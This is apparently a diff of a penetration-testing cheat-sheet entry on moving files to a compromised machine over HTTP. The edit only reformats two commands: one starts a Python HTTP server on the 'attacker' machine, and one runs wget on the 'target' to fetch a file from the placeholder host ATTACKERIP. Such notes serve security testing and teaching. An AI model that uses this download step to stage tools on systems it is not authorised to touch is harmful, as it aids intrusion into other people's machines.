@@ -18,10 +18,10 @@
       <strong>TRANSFER FILES USING HTTP</strong><br>
 Start http server with Python (Win) and download files on target with wget request.<br>
 On attacker (win): <br>
-**python3 -m http.server 1234 c:/testdir** <br>            
-1234 is port where http server will listen, and in last part is default dir for http server.<br>
+python3 -m http.server 1234 c:/testdir <br>            
+-1234 is port where http server will listen, and in last part is directory for http server (not required)<br>
 On target in CMD (win/linux/any):<br>
-**wget http://ATTACKERIP:1234/SOMEFILEINROOTDIR**
+wget http://ATTACKERIP:1234/SOMEFILEINROOTDIR
     </td>
   </tr>
 </table>
